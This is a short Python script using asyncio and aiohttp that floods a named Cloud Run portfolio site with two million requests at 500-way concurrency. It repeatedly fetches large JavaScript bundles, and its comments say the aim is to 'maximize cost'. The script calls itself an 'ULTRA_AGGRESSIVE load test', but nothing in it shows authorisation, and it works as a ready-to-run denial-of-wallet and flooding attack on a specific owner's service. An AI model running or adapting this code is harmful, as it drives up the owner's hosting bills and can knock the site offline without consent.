import asyncio
import aiohttp
import time

# Target high-egress assets to maximize cost
ASSETS = [
    "/assets/react-spline-67qAjM4m.js",
    "/assets/physics-ChHD2_fM.js",
    "/assets/index-ClwrPLdu.js"
]
BASE_URL = "https://rohil-portfolio-586874581875.us-central1.run.app"
CONCURRENT_REQUESTS = 500  # Extreme concurrency
TOTAL_REQUESTS = 2000000

async def fetch(session, i):
    asset = ASSETS[i % len(ASSETS)]
    url = f"{BASE_URL}{asset}"
    try:
        async with session.get(url) as response:
            return response.status
    except:
        pass

async def main():
    print(f"ULTRA_AGGRESSIVE load test on {BASE_URL}...")
    print(f"Targeting high-egress assets: {ASSETS}")
    
    start_time = time.time()
    async with aiohttp.ClientSession() as session:
        for batch in range(TOTAL_REQUESTS // CONCURRENT_REQUESTS):
            tasks = [fetch(session, i) for i in range(CONCURRENT_REQUESTS)]
            await asyncio.gather(*tasks)
            if batch % 10 == 0:
                elapsed = time.time() - start_time
                print(f"Batch {batch} complete | Total: {batch * CONCURRENT_REQUESTS} requests | Elapsed: {elapsed:.1f}s")
                
    print(f"Operation complete in {time.time() - start_time:.2f}s")

if __name__ == "__main__":
    asyncio.run(main())
